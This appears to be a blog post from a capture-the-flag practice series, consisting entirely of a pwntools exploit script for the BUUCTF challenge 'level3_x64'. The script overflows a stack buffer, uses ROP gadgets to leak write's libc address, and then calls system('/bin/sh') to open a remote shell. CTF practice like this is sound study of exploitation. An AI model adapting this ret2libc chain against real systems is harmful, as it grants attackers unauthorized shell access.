+++
title = "exp"
date = "2026-03-05"
type = "post"
categories = ['BUU']
tags = ['第二页', '2-1', '2-1-3']
draft = false
+++
```python
from pwn import *  
from LibcSearcher import LibcSearcher  
  
con=0  
if con:  
    print('当前程序是32位的:')  
    sleep(0.3)  
    context(log_level='debug', arch='i386', os='linux')  
else:  
    print("当前程序是64位的")  
    sleep(0.3)  
    context(log_level='debug', arch='amd64', os='linux')  
context.terminal = ['tmux', 'splitw', '-h']  

local_file = ('./level3_x64')  
elf = ELF(local_file)  
  
  
debug=0  
if debug:  
    print('开始打本地:')  
    sleep(0.3)  
    io=process(local_file)  
else:  
    print("开始打远程")  
    sleep(0.3)  
    io = remote("node5.buuoj.cn",28448)  
  
  
#_______________需要用到的地址区包括offset_____________________  
offset = 0x80 + 0x08  
main_addr = 0x040061A  
pop_rdi = 0x00000000004006b3  
ret_addr = 0x0000000000400499  
pop_rsi = 0x00000000004006b1  
#_________________payload_____________________  
  
  
  
#__________________________________________  
 #——————————————————————————libcsearcher————————————————————    #——————————————————————p64——————————————————        #——————————————————Write——————————————  
plt=elf.plt["write"]  
got=elf.got["write"]  
print("got",got)  
print("plt",plt)  
payload = b'A' * offset + p64(ret_addr) + p64(pop_rdi) + p64(1) +p64(pop_rsi) + p64(got) + p64(4) + p64(plt) + p64(main_addr)  
io.sendlineafter(b"Input:\n",payload)  
  
  
write_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))  
print(hex(write_addr))  
  
libc = LibcSearcher("write", write_addr)  
libc_base = write_addr - libc.dump("write")  
system = libc_base + libc.dump("system")  
binsh = libc_base + libc.dump("str_bin_sh")  
  

payload = b'a' * offset + p64(ret_addr) + p64(pop_rdi) + p64(binsh) + p64(system)  
io.sendlineafter("Input:\n",payload)  
  
io.interactive()
```
